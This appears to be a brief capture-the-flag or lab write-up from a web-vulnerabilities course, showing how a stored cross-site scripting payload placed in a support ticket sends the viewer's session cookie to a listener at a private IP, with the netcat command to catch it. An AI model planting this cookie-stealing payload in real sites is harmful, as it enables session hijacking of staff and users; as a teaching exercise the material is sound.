# Challenge - 3


Make the payload

```javascript
<script>var i=new Image; i.src="http://192.168.182.131:1234/?"+document.cookie;</script>
```

Set up Net Cat listener

```javascript
nc -nvlp 1234
```

Send the payload through the support ticket

Net cat will capture once the ticket is viewed

![Screenshot](./assets/237_Challenge_-_3_1cdd64c5-e0cb-80ba-a7d5-c876df01bacd.png)



---
[Back to Common Web Vulnerabilities](./README.md)
